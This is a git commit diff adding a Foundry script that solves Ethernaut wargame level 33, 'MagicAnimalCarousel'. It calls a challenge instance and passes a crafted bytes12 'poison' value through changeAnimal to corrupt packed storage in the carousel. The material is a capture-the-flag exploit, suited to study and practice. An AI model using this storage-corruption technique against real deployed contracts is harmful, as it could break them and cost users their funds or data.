6456509c45671d1606b46fde5b33550a5515d1a5
Ho-Ya-Ho <rkdgh1056@gmail.com>
2025-08-23 01:13:32 +0900

    33_MagicAnimalCarousel

--- web3/ethernaut/33_MagicAnimalCarousel/script/MagicAnimalCarousel.s.sol
+++ web3/ethernaut/33_MagicAnimalCarousel/script/MagicAnimalCarousel.s.sol
@@ -5,14 +5,20 @@ import {Script, console} from "forge-std/Script.sol";
 import {MagicAnimalCarousel} from "../src/MagicAnimalCarousel.sol";
 
 contract MagicAnimalCarouselScript is Script {
-    MagicAnimalCarousel public counter;
+    MagicAnimalCarousel public magicAnimalCarousel;
 
-    function setUp() public {}
+    function setUp() public {
+        magicAnimalCarousel = MagicAnimalCarousel(0xE0201B2DA25DDd43236e23CBD22354F115EafAaB);
+    }
 
     function run() public {
         vm.startBroadcast();
 
-        counter = new MagicAnimalCarousel();
+        bytes12 poison = 0x10000000000000000000FFFF;
+
+        magicAnimalCarousel.setAnimalAndSpin("Dog");
+        magicAnimalCarousel.changeAnimal(string(abi.encodePacked(poison)), 1);
+        magicAnimalCarousel.setAnimalAndSpin("Parrot");
 
         vm.stopBroadcast();
     }
